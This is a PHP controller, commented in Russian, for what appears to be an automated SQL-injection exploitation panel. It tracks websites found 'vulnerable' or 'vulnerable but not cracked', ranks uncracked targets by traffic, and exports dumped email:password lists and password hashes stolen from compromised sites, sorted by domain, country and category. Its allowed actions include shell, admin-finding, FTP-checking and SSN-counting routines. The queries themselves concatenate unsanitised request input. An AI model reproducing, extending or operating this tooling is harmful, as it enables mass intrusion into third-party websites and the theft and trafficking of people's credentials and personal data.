<?php

ini_set("memory_limit","5000M");
set_time_limit(0);
ignore_user_abort(true);
//error_reporting(E_ALL);
error_reporting(0);


   




class PostsController extends AppController {
	
	var $name ='Post';
	var $uses = array('Filed','Post','Start','Multi');
	var $helpers = array('form','html','javascript','paginator','ajax');
	//var $components = array('RequestHandler','Session','Injector','Googlepr');
	var $components = array('RequestHandler','Session','Injector','Baseauth','Googlepr');
	var $paginate = array();
	
	 
	function __construct() {
		
		
		parent::__construct();
		include($_SERVER['DOCUMENT_ROOT'].'/config.php');
		
	}
	
	function beforeFilter(){

		$pp = new DATABASE_CONFIG;
				
		$this->bdmain =$pp->default['database'];
	
    
    
    
    
	
		$this->Baseauth->allow=array('selfProverka','renamename','errorFinder','multi','getcountmail','getmailfull','psn2','getInfo_country','rendown2','rendown1','rendown_one','rendown_one2','passwordAllsqule','getmailfullMulti','getinfo_category','getInfo_pr','getInfo_alexa','evaltest','admin','getorders','typecorp_one','typecorp_pass','mx_check','smtp_check','hash3','testing','test','mx_check_one','sort','getInfo_country2','abuse','thepid','pid_stop','dumpfile','dump_reset','dump_count','dumpfile2','dump_reset2','dump_count2','cleanmail','domens','mailinfo2','sqliShell','ccc','getCountOrders','count_16','count_16_one','postinfo','add_cron','optimize','repaire','dumping_one','check_domens','check_pr_domen','check_alexa_domen','check_country_domen','find_domen_sqli','check_posts','findadmin','findfiles','checkftp','count_new','evalpredtest','ku','getcountmailMSSQL','saltAllsqule','nameAllsqule','getCountOrdersMSSQL','getCountSsn','getCountSsnMSSQL','dumping_one_filed_name','phoneAllsqule','loginAllsqule','getToAll','add_all_to_posts','post_input','crowler','check_posts_all_to_post','chengetable_one_orders','multi_all','errorFinder_all','ssn_16','badcheksshells','checkblackshells','multi_duble_check','multi_duble_check2','update_all_oll','AdressAllsqule','getCountAdmin','getCountAdminPage'); 
	}
	
	function afterFilter(){//Когда перестали работать с inject то нам надо очистить массив url чтобы в логах не мешался
		
		$urls = $this->Session->read('urls');
		
		if(isset($this->mysqlInj))
		{
			
			if(count($urls)==0)
			{

				$this->Session->write('urls',$this->mysqlInj->urls);
			}else
			{
				
				$urls = @array_merge($this->mysqlInj->urls,$urls);
				$this->Session->write('urls',$urls);
			}
			
		}else{
			
			if(count($urls)==0)$urls = array();
		}
		
	}
	
	function beforeRender(){ // тоже суммарная инфа
		

		$urls = $this->Session->read('urls');
		$this->set('urls',$urls);
		
		$this->set('field',$this->Session->read('field'));
		$this->set('table',$this->Session->read('table'));
		
		
		
		$posts_all = $this->Post->query("SELECT count(*) FROM `posts_all` ");
		$this->set('posts_all',$posts_all[0][0]['count(*)']);
		
		
		$posts_all_check = $this->Post->query("SELECT count(*) FROM `posts_all` WHERE `check_posts` =1 ");
		$this->set('posts_all_check',$posts_all_check[0][0]['count(*)']);
		
		
		$shlak_domens111 = $this->Post->query("SELECT count(*) FROM `domens` WHERE `status`=1 or `bad`=1 ");
		$this->set('shlak_domens',$shlak_domens111[0][0]['count(*)']);
		
		$shlak_domens1110 = $this->Post->query("SELECT count(*) FROM `domens` WHERE `status` !=0 AND  `status` !=1 AND `bad` !=1");
		$this->set('domens10',$shlak_domens1110[0][0]['count(*)']);
		
		$shlak_domens1111 = $this->Post->query("SELECT count(*) FROM `domens` WHERE `status` =1   or `bad` =1");
		$this->set('domens11',$shlak_domens1111[0][0]['count(*)']);
		
		
		$shlak_domens11112 = $this->Post->query("SELECT count(*) FROM `posts_all` WHERE `status`=2 or `status`=3 ");
		$this->set('domens_links',$shlak_domens11112[0][0]['count(*)']);
		
		
		
		$usp = file_get_contents($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/usp.txt");
		if(strlen($usp)==0 or !file_exists($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/usp.txt")){
			$usp = '0 шт';
		}
		$this->set('usp',$usp);
		
		//найденные но не взломанные
		$usp22 = $this->Post->query("SELECT count(*) as `count` FROM 	`posts` WHERE `status`=2 and `prohod` =5");		
		$tmp22 = $usp22[0][0]['count'];
		
		$this->set('usp22',$tmp22);
		
		
		$usp2 = file_get_contents($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/usp2.txt");
		if(strlen($usp2)==0 or !file_exists($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/usp2.txt")){
			$usp2 = '0 шт';
		}
		$this->set('usp2',$usp2);
		
		
		
		$usp3 = file_get_contents($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/usp3.txt");
		if(strlen($usp3)==0 or !file_exists($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/usp3.txt")){
			$usp3 = '0 шт';
		}
		$this->set('usp3',$usp3);
		
		
		
		$usp4 = file_get_contents($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/usp4.txt");
		if(strlen($usp4)==0 or !file_exists($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/usp4.txt")){
			$usp4 = '0 шт';
		}
		$this->set('usp4',$usp4);
		
		
		
		$usp44 = file_get_contents($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/usp44.txt");
		if(strlen($usp44)==0 or !file_exists($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/usp44.txt")){
			$usp44 = '0 шт';
		}
		$this->set('usp44',$usp44);
		
		$mat = file_get_contents($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/mat.txt");
		if(strlen($mat)==0 or !file_exists($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/mat.txt")){
			$mat = '0 шт';
		}
		$this->set('mat',$mat);
		
		
		
		$shlak = file_get_contents($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shlak.txt");
		if(strlen($shlak)==0 or !file_exists($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shlak.txt")){
			$shlak = '0 шт';
		}
		$this->set('shlak',$shlak);
		
		
		
		$shlak2 = file_get_contents($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shlak2.txt");
		if(strlen($shlak2)==0 or !file_exists($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shlak2.txt")){
			$shlak2 = '0 шт';
		}
		$this->set('shlak2',$shlak2);
		
		$data = $this->Session->read('inject');
		
		//print_r($data);
		if(!empty($data)){
			//print_r($data);
			$data['bd'] = array('ss','vv','ff');
			$this->set('inject',$data);
		}
		if($this->RequestHandler->isAjax()==true)$this->layout=false;
	}
	
	
	
	
	function down_test_shlak(){
		
			
					$data0 = $this->Filed->query("SELECT url FROM `posts` WHERE `status` =1");
					
					$c0 = $this->Filed->query("SELECT count(*) FROM `posts` WHERE `status` =1");
					
					foreach($data0 as $d)
					{
						
						
						
						$z0 .= $d['posts']['url'];
						$z0 .= "\r\n";
					}
					
					
					

					
					$count = $c0[0][0]['count(*)'];
					//$this->d($count);
					//exit;
					
					
					$str = $z0;
					
					$all = 'SHLAK';
				
				
				
				
				header('Content-type: application/txt');
				header("Content-Disposition: attachment; filename='{$all}.txt'");
				echo "$z0";
				die();
		
		
	}	
			
	
	function down_test(){
		
			
					$data0 = $this->Filed->query("SELECT url FROM `posts` WHERE `status` =3 AND version !=''");
					
					$c0 = $this->Filed->query("SELECT count(*) FROM `posts` WHERE `status` =3 AND version !=''");
					
					foreach($data0 as $d)
					{
						
						
						
						$z0 .= $d['posts']['url'];
						$z0 .= "\r\n";
					}
					
					
					

					
					$count = $c0[0][0]['count(*)'];
					//$this->d($count);
					//exit;
					
					
					$str = $z0;
					
					$all = 'Уязвимые';
				
				
				
				
				header('Content-type: application/txt');
				header("Content-Disposition: attachment; filename='{$all}.txt'");
				echo "$z0";
				die();
		
		
	}	
		
	function down_test_priv(){
		
			
					$data0 = $this->Filed->query("SELECT url FROM `posts` WHERE `status` =3 AND version !='' AND `file_priv`=1");
					
					$c0 = $this->Filed->query("SELECT count(*) FROM `posts` WHERE `status` =3 AND version !=''");
					
					foreach($data0 as $d)
					{
						
						
						
						$z0 .= $d['posts']['url'];
						$z0 .= "\r\n";
					}
					
					
					

					
					$count = $c0[0][0]['count(*)'];
					//$this->d($count);
					//exit;
					
					
					$str = $z0;
					
					$all = 'Уязвимые';
				
				
				
				
				header('Content-type: application/txt');
				header("Content-Disposition: attachment; filename='{$all}.txt'");
				echo "$z0";
				die();
		
		
	}	
		
		
	function down_head_test(){
		
			
					$data0 = $this->Filed->query("SELECT url FROM `posts` WHERE `status` =2 AND (  find ='cookies' or find ='referer' or find ='post' or find ='useragent'  or find ='forwarder')");
					
						//$c0 = $this->Filed->query("SELECT count(*) FROM `posts` WHERE `status` =3 AND version !=''");
					
					foreach($data0 as $d)
					{
						
						
						
						$z0 .= $d['posts']['url'];
						$z0 .= "\r\n";
					}
					
					
					

					
					//$count = $c0[0][0]['count(*)'];
					//$this->d($count);
					//exit;
					
					
					$str = $z0;
					
					$all = 'Потенциально уязвимые HEAD';
				
				
				
				
				header('Content-type: application/txt');
				header("Content-Disposition: attachment; filename='{$all}.txt'");
				echo "$z0";
				die();
		
		
	}	
			
	function down_multi(){
		
					$data0 = $this->Filed->query("SELECT url FROM `posts` WHERE `status` =2 AND version ='' AND prohod=5");
					
					//$c0 = $this->Filed->query("SELECT count(*) FROM `posts` WHERE `status` =3 AND version =''");
					
					foreach($data0 as $d)
					{
						
						
						
						$z0 .= $d['posts']['url'];
						$z0 .= "\r\n";
					}
					
					
					

					
					//$count = $c0[0][0]['count(*)'];
					//$this->d($count);
					//exit;
					
					
					$str = $z0;
					
					$all = 'УязвимыеНОневскрытые';
				
				
				
				
				header('Content-type: application/txt');
				header("Content-Disposition: attachment; filename='{$all}.txt'");
				echo "$z0";
				die();
	}

	function down_multi_top(){
		
					$data0 = $this->Filed->query("SELECT url FROM `posts` WHERE `status` =2 AND version ='' AND `prohod`=5 AND `alexa` < 50000");
					
					//$c0 = $this->Filed->query("SELECT count(*) FROM `posts` WHERE `status` =3 AND version =''");
					
					foreach($data0 as $d)
					{
						
						
						
						$z0 .= $d['posts']['url'];
						$z0 .= "\r\n";
					}
					
					
					

					
					//$count = $c0[0][0]['count(*)'];
					//$this->d($count);
					//exit;
					
					
					$str = $z0;
					
					$all = 'ТОПНЕВСКРЫТЫЕ';
				
				
				
				
				header('Content-type: application/txt');
				header("Content-Disposition: attachment; filename='{$all}.txt'");
				echo "$z0";
				die();
	}

		
	
	///////ВЫВОД ИНФОРМАЦИИ НА ЭКРАН, ВЫБОРКИ, СУММАРНАЯ///////////
	
	function squleview(){//отображение таблицы fileds
		
		
		$this->s();
		$data = $this->Post->query("SELECT * FROM  `fileds` WHERE post_id !=' ' group by post_id order by count");
		$p = array();
		
		//$this->p('select fileds');
		
		//$this->d($data);
		
		$i = 1;
		
		foreach($data as $d)
		{
			$p[$i]['squle_post'] = $d['fileds']['post_id'];
			
			$p[$i]['squle_fileds'] = $d['fileds']['id'];
			
			$g =  $this->Post->query("SELECT * FROM  `posts` WHERE id=".$p[$i]['squle_post']);
			
			//$this->d($g,'g');	
			
			$g2 = $this->Post->query("SELECT * FROM  `fileds` WHERE post_id='".$p[$i]['squle_post']."'");
			
			//$this->d($g2,'g2');
			
			foreach($g2 as $g23){
				$p[$i]['table'][] = 	$g23['fileds']['table'];
				$p[$i]['label'][] = 	$g23['fileds']['label'];
				$p[$i]['lastlimit'][] = $g23['fileds']['lastlimit'];
				$p[$i]['count'][] = 	$g23['fileds']['count'];
				$p[$i]['password'][] =  $g23['fileds']['password'];
				$p[$i]['get'][] = 		$g23['fileds']['get'];
				$p[$i]['dok'][] = 	 	$g23['fileds']['dok'];
				
			}
			
			$p[$i]['url'] = $g[0]['posts']['url'];
			$i++;
		}
		
		//$this->p('squle');
		
		$this->set('data',$p);
		
	}
	
	function rendview(){//отображение только тех сайтов, у которых уже есть скачанные дампы
		
		
		//$this->d($this->params);
		//exit;
		
		if($this->params['form']['update'])
		{
			$domen  = $this->params['form']['domen'];
			$category  = $this->params['form']['category'];
			
			
			$this->Post->query("UPDATE  `renders` SET  `category` = '{$category}' WHERE  `domen` ='".$domen."'");
			
			
		}
		
		
		if($this->params['isAjax'] == 1)
		{
			
			
			$domen = trim($this->params['pass'][0]);
			$this->Filed->query("DELETE FROM `renders` WHERE domen = '$domen'");
			//if($this->Filed->query("DELETE FROM `mails` WHERE domen = '$domen'"))echo 'Удален';
			
			
			
			die;

		}
		
		if($this->params['pass'][0] == 'id'){
			$data = $this->Filed->query("SELECT * FROM  `renders` ORDER BY id DESC");
		}elseif($this->params['pass'][0] == 'countMail'){
			$data = $this->Filed->query("SELECT * FROM  `renders` ORDER by countMail DESC");
		}elseif($this->params['pass'][0] == 'countPass'){
			$data = $this->Filed->query("SELECT * FROM  `renders` ORDER by countPass DESC");
		}elseif($this->params['pass'][0] == 'countNoHash'){
			$data = $this->Filed->query("SELECT * FROM  `renders` ORDER by countNoHash DESC");
		}elseif($this->params['pass'][0] == 'countHash'){
			$data = $this->Filed->query("SELECT * FROM  `renders` ORDER by countHash DESC");
		}elseif($this->params['pass'][0] == 'date'){
			$data = $this->Filed->query("SELECT * FROM  `renders` ORDER by date DESC");
		}elseif($this->params['pass'][0] == 'category'){
			$data = $this->Filed->query("SELECT * FROM  `renders` ORDER by category");
		}elseif($this->params['pass'][0] == 'country'){
			$data = $this->Filed->query("SELECT * FROM  `renders` ORDER by country ");
		}else{
			$data = $this->Filed->query("SELECT * FROM  `renders` ORDER by category");
		}
		
		$this->set('data',$data);
		
	}
	
	function rendview2(){//отображение только тех сайтов, у которых уже есть скачанные дампы
		
		
		//$this->d($this->params);
		//exit;
		
		if($this->params['form']['update'])
		{
			$domen  = $this->params['form']['domen'];
			$category  = $this->params['form']['category'];
			
			//$this->d($domen);
			//$this->d($category);
			
			$this->Post->query("UPDATE  `renders_one` SET  `category` = '{$category}' WHERE  `domen` ='".$domen."'");
			
			
			//die();
			
		}
		
		
		if($this->params['isAjax'] == 1)
		{
			
			
			$domen = trim($this->params['pass'][0]);
			$this->Filed->query("DELETE FROM `renders_one` WHERE domen = '$domen'");
			if($this->Filed->query("DELETE FROM `mails_one` WHERE domen = '$domen'"))echo 'Удален';
			
			
			
			die;

		}
		
		if($this->params['pass'][0] == 'id'){
			$data = $this->Filed->query("SELECT * FROM  `renders_one` ORDER BY id DESC");
		}elseif($this->params['pass'][0] == 'countMail'){
			$data = $this->Filed->query("SELECT * FROM  `renders_one` ORDER by countMail DESC");
		}elseif($this->params['pass'][0] == 'countPass'){
			$data = $this->Filed->query("SELECT * FROM  `renders_one` ORDER by countPass DESC");
		}elseif($this->params['pass'][0] == 'countNoHash'){
			$data = $this->Filed->query("SELECT * FROM  `renders_one` ORDER by countNoHash DESC");
		}elseif($this->params['pass'][0] == 'countHash'){
			$data = $this->Filed->query("SELECT * FROM  `renders_one` ORDER by countHash DESC");
		}elseif($this->params['pass'][0] == 'date'){
			$data = $this->Filed->query("SELECT * FROM  `renders_one` ORDER by date DESC");
		}elseif($this->params['pass'][0] == 'category'){
			$data = $this->Filed->query("SELECT * FROM  `renders_one` ORDER by category");
		}elseif($this->params['pass'][0] == 'country'){
			$data = $this->Filed->query("SELECT * FROM  `renders_one` ORDER by country ");
		}else{
			$data = $this->Filed->query("SELECT * FROM  `renders_one` ORDER by category");
		}
		
		$this->set('data',$data);
		
	}
	
	
	
	function databases(){// выводит инфу о базах которые парсятся, чё сколько и какие медленные
		
		
		
		$data = $this->paginate('Filed');
		
		$this->set('data',$data);
		
		
	}
	
	function domens_old(){//выводит инфу по спарсенным сайтам(НЕ ОЧЕНЬ АКТУАЛЬНО)долго
		
		
		
		
		//echo '<pre>';
		//print_r($this->params);
		//echo '</pre>';
		
		
		if($this->params['isAjax'] == 1)
		{
			
			
			$domen = $this->params['pass'][0];
			//if($this->Filed->query("DELETE FROM `mails` WHERE domen = '$domen'"))echo 'Удален';
			
			die;

		}
		
		
		if($this->params['form']['dateselect'] !='')
		{	
			
			$sdate  = $this->params['form']['sdate'];
			$podate = $this->params['form']['podate'];
			
			$data = $this->Filed->query("SELECT domen FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' GROUP BY domen order by count(domen) DESC limit 50");
			$p  = array();

			
			
			foreach ($data as $d)
			{
				$z = $d['mails']['domen'];
				
				$p[$z][] = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE domen = '{$z}' AND date >= '$sdate' AND date <= '$podate'");
				
				$p[$z][] = $this->Filed->query("SELECT count(pass) FROM  `mails` WHERE domen = '{$z}' AND pass ='0' ");
				
				$p[$z][] = $this->Filed->query("SELECT pass FROM  `mails` WHERE domen = '{$z}' AND date >= '$sdate' AND date <= '$podate' order by rand() limit 3");
				
				$p['sdate'] = $this->Filed->query("SELECT date FROM  `mails` group by date ");
				$p['podate'] = $this->Filed->query("SELECT date FROM  `mails` group by date DESC");
				
				$p['sdate1']  = $sdate;
				$p['podate1'] = $podate;
				
				$p['sdate1_one']  = $sdate_one;
				$p['podate1_one'] = $podate_one;
				
				$p[$z]['country'] = $this->Filed->query("SELECT country FROM  `fileds` WHERE  post_id = (select id from `posts` WHERE url like '%$z%' limit 0,1) limit 0,1");
				
				$p[$z]['category'] = $this->Filed->query("SELECT category FROM  `fileds` WHERE  post_id = (select id from `posts` WHERE url like '%$z%' limit 0,1) limit 0,1");
				
				
				
				
			}
			
			$this->set('data',$p);
			
			
			
		}elseif($this->params['form']['down'] !='')
		{
			$sdate  = $this->params['form']['sdate'];
			$podate = $this->params['form']['podate'];

			$domen = $this->params['form']['domen'];
			
			
			$str = '123';
			
			//////// БЛОК с пассами без хешей///////////
			if(isset($podate) AND $podate !='')
			{
				
				$data0 = $this->Filed->query("SELECT zona,email,pass,hashtype FROM  `mails` WHERE domen = '$domen' AND date >= '$sdate' AND date <= '$podate' AND pass !='0' AND hashtype ='0'");
			}else{
				$data0 = $this->Filed->query("SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE domen = '$domen' AND pass !='0' AND hashtype ='0'");
			}
			
			
			$z0 = '';
			
			foreach($data0 as $d)
			{
				$z0 .= $d['mails']['email'];
				$z0 .= ":";
				$z0 .= $d['mails']['pass'];
				$z0 .= "\r\n";

			}
			
			
			//////// БЛОК с пассами///////////
			if(isset($podate) AND $podate !=''){
				
				$data1 = $this->Filed->query("SELECT zona,email,pass,hashtype FROM  `mails` WHERE domen = '$domen' AND date >= '$sdate' AND date <= '$podate' AND pass !='0' AND hashtype !='0'");
			}else{
				$data1 = $this->Filed->query("SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE domen = '$domen' AND pass !='0' AND hashtype !='0'");
			}
			
			
			$z1 = '';
			
			foreach($data1 as $d)
			{
				$z1 .= $d['mails']['email'];
				$z1 .= ":";
				$z1 .= $d['mails']['pass'];
				$z1 .= "\r\n";

			}
			
			
			
			
			////////БЛОК без пассов///////////
			
			if(isset($podate) AND $podate !=''){
				
				$data2 = $this->Filed->query("SELECT zona,email,pass,hashtype FROM  `mails` WHERE domen = '$domen' AND date >= '$sdate' AND date <= '$podate' AND pass ='0'");
			}else{
				$data2 = $this->Filed->query("SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE domen = '$domen' AND pass ='0'");
			}
			
			
			$z2 = '';
			
			foreach($data2 as $d2)
			{
				$z2 .= $d2['mails']['email'];
				$z2 .= "\r\n";
				
			}
			
			
			
			
			$p['country'] = $this->Filed->query("SELECT country FROM  `fileds` WHERE  post_id = (select id from `posts` WHERE url like '%$domen%' limit 0,1) limit 0,1");
			
			$p['category'] = $this->Filed->query("SELECT category FROM  `fileds` WHERE  post_id = (select id from `posts` WHERE url like '%$domen%' limit 0,1) limit 0,1");
			
			
			$category = $p['category'][0]['fileds']['category'];
			$country = $p['country'][0]['fileds']['country'];
			
			
			//////// БЛОК с пассами КОЛИЧЕСТВО///////////
			if(isset($podate) AND $podate !='')
			{
				$count = $data = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE domen = '$domen' AND date >= '$sdate' AND date <= '$podate' AND pass !='0'");
				$count = $count[0][0]['count(*)'];
			}else
			{
				$count = $data = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE domen = '$domen' AND pass !='0'");
				$count = $count[0][0]['count(*)'];
			}
			
			//////// БЛОК ПРОСТО EMAILS КОЛИЧЕСТВО///////////
			if(isset($podate) AND $podate !='')
			{
				$count2 = $data = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE domen = '$domen' AND date >= '$sdate' AND date <= '$podate'");
				$count2 = $count2[0][0]['count(*)'];
			}else
			{
				$count2 = $data = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE domen = '$domen'");
				$count2 = $count2[0][0]['count(*)'];
			}
			
			$all ='';
			
			
			$str = $z0.$z1.$z2;
			
			
			
			
			////БЛОК ПОДСЧЁТА ХЭШЕЙ//////////
			
			$counthash = $data = $this->Filed->query("SELECT count(pass) FROM  `mails` WHERE domen = '$domen' AND hashtype !='0' AND pass !='0'");
			
			$hashtype = $counthash[0][0]['count(pass)'];
			
			
			
			
			$counthash2 = $data = $this->Filed->query("SELECT count(pass) FROM  `mails` WHERE domen = '$domen' AND hashtype ='0' AND pass !='0'");
			
			$hashtype2 = $counthash2[0][0]['count(pass)'];
			
			
			
			
			
			
			$all .= $domen;
			
			if($count >= 1)
			{
				$all .= '//ALLcountPASS_'.$count;	
			}
			
			
			if($hashtype >=1){
				$all .='//PASShash_'.$hashtype;
			}

			if($hashtype >=1){
				$all .='//PASSnoHASH_'.$hashtype2;
			}	
			
			
			
			if($count2 >= 1)
			{
				$all .= '//ALLcountEMAILS_'.$count2;
			}
			
			///КАТЕГОРИЯ///////////
			
			if(isset($category))
			{
				$all .='//category_'.$category;
			}
			if(isset($country))
			{
				$all .='//country_'.$country;	
			}
			
			
			//$this->d($all);
			//exit;

			
			header('Content-type: application/txt');
			header("Content-Disposition: attachment; filename='{$all}.txt'");
			echo "$str";
			
			
			
			
		}else
		{
			
			$data = $this->Filed->query("SELECT domen FROM  `mails` GROUP BY domen order by count(domen) DESC limit 50");
			$p  = array();
			
			foreach ($data as $d)
			{
				$z = $d['mails']['domen'];
				
				$p[$z][] = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE domen = '{$z}'");
				
				$p[$z][] = $this->Filed->query("SELECT pass FROM  `mails` WHERE domen = '{$z}' AND pass !='0' order by rand() limit 3");
				
				$p[$z]['nohash'] = $this->Filed->query("SELECT count(pass) FROM  `mails` WHERE domen = '{$z}' AND pass !='0' AND hashtype ='0'");
				
				$p[$z]['hash'] = $this->Filed->query("SELECT count(pass) FROM  `mails` WHERE domen = '{$z}' AND pass !='0' AND hashtype !='0'");
				
				$p['sdate'] = $this->Filed->query("SELECT date FROM  `mails` group by date ");
				$p['podate'] = $this->Filed->query("SELECT date FROM  `mails` group by date DESC");
				
				$p[$z]['country'] = $this->Filed->query("SELECT country FROM  `fileds` WHERE  post_id = (select id from `posts` WHERE url like '%$z%' limit 0,1) limit 0,1");
				
				$p[$z]['category'] = $this->Filed->query("SELECT category FROM  `fileds` WHERE  post_id = (select id from `posts` WHERE url like '%$z%' limit 0,1) limit 0,1");
				
				
			}
			
			$this->set('data',$p);
		}
		
	}	
	
	function domens2_old(){ // выводит информацию по почтовым доменам после собаки (НЕ АКТУАЛЬНО)долго
		
		
		//echo '<pre>';
		//print_r($this->params);
		//echo '</pre>';
		
		if($this->params['isAjax'] == 1)
		{
			
			
			$z = $this->params['pass'][0];
			
			//if($this->Filed->query("DELETE FROM `mails` WHERE email LIKE  '%@$z' "))echo 'Удален';
			die;
			$p[$z][] = $this->Filed->query("SELECT  count(*) email FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND email LIKE  '%@$z' ");

		}
		
		
		
		///////////////////////////
		//если хочет удалить по количеству
		if($this->params['form']['countdelete'] !='')
		{
			$count = $this->params['form']['countdelete'];
			
			$data = $this->Filed->query("SELECT meiler FROM  `mails` GROUP BY meiler order by count(meiler) DESC limit 50");
			
			
			
			
			foreach ($data as $d)
			{

				$z = $d['mails']['meiler'];

				$z = trim($z);
				
				$c = $this->Filed->query("SELECT  count(meiler)  FROM  `mails`  WHERE meiler = '{$z}' ");
				
				
				
				$c2 = $c[0][0]['count(meiler'];
				

				
				if($c2 <= $count)
				{
					//$this->Filed->query("DELETE FROM `mails` WHERE meiler = '{$z}'");
					echo "domen $z, count$c2 <br>";
					
				}else{
					continue;
				}	
			}
			$this->redirect(array('action'=>'domens2'));
		}
		
		//если чел по дате выбирает 
		if($this->params['form']['dateselect'] !='')
		{	
			
			
			
			$sdate  = $this->params['form']['sdate'];
			$podate = $this->params['form']['podate'];
			
			
			
			$data = $this->Filed->query("SELECT meiler FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' GROUP BY meiler order by count(meiler) DESC limit 50");
			
			
			$p  = array();
			
			$p['sdate1']  = $sdate;
			$p['podate1'] = $podate;
			
			$p['sdate'] = $this->Filed->query("SELECT date FROM  `mails` group by date ");
			$p['podate'] = $this->Filed->query("SELECT date FROM  `mails` group by date DESC");
			
			foreach ($data as $d)
			{
				
				$z = $d['mails']['meiler'];

				$z = trim($z);
				
				
				$p[$z][] = $this->Filed->query("SELECT  count(meiler)  FROM  `mails` WHERE meiler = '{$z}' AND date >= '$sdate' AND date <= '$podate' ");
				
				$p[$z][] = $this->Filed->query("SELECT  count(meiler)  FROM  `mails` WHERE meiler = '{$z}' AND hashtype != '0' AND date >= '$sdate' AND date <= '$podate'");
				
				$p[$z][] = $this->Filed->query("SELECT  count(meiler)  FROM  `mails` WHERE meiler = '{$z}' AND hashtype = '0' AND date >= '$sdate' AND date <= '$podate'" );
				
				$p[$z][] = $this->Filed->query("SELECT  count(meiler)  FROM  `mails` WHERE meiler = '{$z}' AND date >= '$sdate' AND date <= '$podate'" );
				
			}
			
			
			$this->set('data',$p);
			
			
			//если нажали СКАЧАТЬ
			/////////////////////////////////////////////////
		}elseif($this->params['form']['down'] !='')
		{

			$sdate  = $this->params['form']['sdate'];
			$podate = $this->params['form']['podate'];

			$domen = $this->params['form']['domen'];
			
			
			
			if(isset($podate) AND $podate !='')
			{
				if($this->params['form']['down'] == 'down pass'){
					$data = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND meiler = '{$domen}' AND pass !='0'");
				}elseif($this->params['form']['down'] == 'down hash'){
					$data = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND meiler = '{$domen}'  AND  hashtype != '0' AND pass !='0'");
				}elseif($this->params['form']['down'] == 'down open'){
					$data = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND meiler = '{$domen}'  AND hashtype = '0' AND pass !='0'");
				}elseif($this->params['form']['down'] == 'down emails'){
					$data = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND meiler = '{$domen}' ");
				}
			}else
			{
				
				if($this->params['form']['down'] == 'down pass'){
					$data = $this->Filed->query("SELECT * FROM  `mails` WHERE meiler = '{$domen}'  AND pass !='0'");
				}elseif($this->params['form']['down'] == 'down hash'){
					$data = $this->Filed->query("SELECT * FROM  `mails` WHERE meiler = '{$domen}'  AND  hashtype != '0' AND pass !='0'");
				}elseif($this->params['form']['down'] == 'down open'){
					$data = $this->Filed->query("SELECT * FROM  `mails` WHERE meiler = '{$domen}'  AND hashtype = '0' AND pass !='0'");
				}elseif($this->params['form']['down'] == 'down emails'){
					$data = $this->Filed->query("SELECT * FROM  `mails` WHERE meiler = '{$domen}'");
				}
				
				
				
				
			}
			
			
			
			
			$z = '';
			
			foreach($data as $d)
			{
				
				
				$z .= $d['mails']['email'];
				
				if($d['mails']['pass'] !='' AND $d['mails']['pass'] !='0' AND $this->params['form']['down'] != 'down emails')
				{
					$z .= ":";
					$z .= $d['mails']['pass'];
				}
				$z .= "\r\n";
				
				if($d['mails']['hashtype'] != '0')
				{
					$hashtype = $d['mails']['hashtype'];
				}
			}
			
			if(isset($podate) AND $podate !='')
			{
				
				if($this->params['form']['down'] == 'down pass'){
					$count = $this->Filed->query("SELECT  count(meiler)  FROM  `mails` WHERE meiler = '{$domen}' AND date >= '$sdate' AND date <= '$podate' AND pass !='0'");
				}elseif($this->params['form']['down'] == 'down hash'){
					
					$count = $this->Filed->query("SELECT  count(meiler)  FROM  `mails` WHERE meiler = '{$domen}' AND date >= '$sdate' AND date <= '$podate' AND  hashtype != '0' AND pass !='0'");
					
				}elseif($this->params['form']['down'] == 'down open'){
					
					$count = $this->Filed->query("SELECT  count(meiler)  FROM  `mails` WHERE meiler = '{$domen}' AND date >= '$sdate' AND date <= '$podate' AND hashtype = '0' AND pass !='0'");
				}elseif($this->params['form']['down'] == 'down emails'){
					
					$count = $this->Filed->query("SELECT  count(meiler)  FROM  `mails` WHERE meiler = '{$domen}' AND date >= '$sdate' AND date <= '$podate'");
				}
				
				
			}else
			{
				
				if($this->params['form']['down'] == 'down pass'){
					$count = $this->Filed->query("SELECT  count(meiler)  FROM  `mails` WHERE meiler = '{$domen}' AND pass !='0'");
				}elseif($this->params['form']['down'] == 'down hash'){
					
					$count = $this->Filed->query("SELECT  count(meiler)  FROM  `mails` WHERE meiler = '{$domen}' AND  hashtype != '0' AND pass !='0'");
					
				}elseif($this->params['form']['down'] == 'down open'){
					
					$count = $this->Filed->query("SELECT  count(meiler)  FROM  `mails` WHERE meiler = '{$domen}' AND hashtype = '0' AND pass !='0'");
				}elseif($this->params['form']['down'] == 'down emails'){
					
					$count = $this->Filed->query("SELECT  count(meiler)  FROM  `mails` WHERE  meiler = '{$domen}'");
				}
				
				
			}
			
			
			//echo '<pre>';
			//print_r($count);
			//echo '</pre>';
			//exit;	
			
